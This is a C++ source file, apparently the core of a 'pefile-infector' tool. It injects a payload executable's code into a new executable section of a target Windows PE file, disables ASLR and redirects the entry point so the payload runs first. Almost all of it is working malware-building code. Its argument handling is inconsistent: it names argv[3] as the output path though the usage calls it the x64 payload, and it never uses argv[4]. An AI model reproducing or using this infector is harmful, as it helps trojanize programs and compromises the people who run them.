#include <cstdlib>
#include <iostream>
#include "pe.h"
#include "helpers.h"
#include "exception.h"
#include <argparse/argparse.hpp>

int main(const int argc, const char **argv) {
    if (argc != 5) {
        std::cerr << "Usage: pefile-infector.exe [target-path] [payload86-path] [payload64-path] [output-path]" << std::endl;
        exit(1);
    }

    const char *targetName = argv[1];
    std::cout << "INFECTING: " << targetName << std::endl;

    const char *payloadName = argv[2];
    std::cout << "x86 PAYLOAD: " << payloadName << std::endl;

    const char *outputPath = argv[3];
    std::cout << "OUTPUT: " << outputPath << std::endl;

    PE* target = nullptr;
    PE* payload = nullptr;
    try {
        target = new PE(targetName);
        payload = new PE(payloadName);

        std::string textSectionName = ".text";

        auto payloadTextSection = payload->getCommitableSectionByName(textSectionName);
        auto payloadTextData = payload->getCommitableSectionData(payloadTextSection);

        std::string infectSectionName = "infect";
        target->pushNewSection(infectSectionName,
                               payloadTextSection->SizeOfRawData,
                               IMAGE_SCN_MEM_WRITE |
                               IMAGE_SCN_CNT_CODE  |
                               IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                               IMAGE_SCN_MEM_EXECUTE |
                               IMAGE_SCN_CNT_INITIALIZED_DATA |
                               IMAGE_SCN_MEM_READ);

        auto newSection = target->getCommitableSectionByName(infectSectionName);
        target->writeSectionData(newSection, payloadTextData, payloadTextSection->SizeOfRawData);

        if (target->getFormat() == IMAGE_FORMAT_PE32) {
            auto header = target->getCommitableNtHeaders32();
            header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
            header->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
            header->FileHeader.Characteristics = 0x010F;
        } else {
            auto header = target->getCommitableNtHeaders64();
            header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
            header->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
            header->FileHeader.Characteristics = 0x010F;
        }

        target->save(outputPath);
        target->destroy();
        payload->destroy();
    } catch (Exception &e) {
        target->destroy();
        payload->destroy();
        std::cout << "Failure to load/parse PE file: " + std::string(e.what()) << std::endl;
        return 1;
    }

    return 0;
}
